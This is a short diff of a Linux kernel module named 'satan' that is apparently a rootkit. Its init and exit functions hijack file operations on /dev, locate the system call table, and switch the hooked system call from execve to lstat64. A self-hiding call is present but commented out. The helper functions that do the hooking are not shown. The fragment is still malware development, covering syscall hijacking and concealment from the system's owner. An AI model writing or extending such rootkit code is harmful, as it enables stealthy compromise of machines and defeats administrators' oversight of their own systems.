@@ -14,8 +14,8 @@ static int __init satan_init(void)
         satan_dev_init(THIS_MODULE);
         satan_hijack_f_op("/dev");
         satan_locate_sys_call_table();
-        satan_hijack_execve();
-        //satan_hijack_lstat64();
+        //satan_hijack_execve();
+        satan_hijack_lstat64();
         //satan_set_hidden(true);
         return 0;
 }
@@ -26,8 +26,8 @@ static void __exit satan_exit(void)
         satan_dev_destroy();
         satan_unhijack_f_op("/dev");
         //satan_set_hidden(false);
-        satan_restore_execve();
-        //satan_restore_lstat64();
+        //satan_restore_execve();
+        satan_restore_lstat64();
 }
 
 module_init(satan_init);
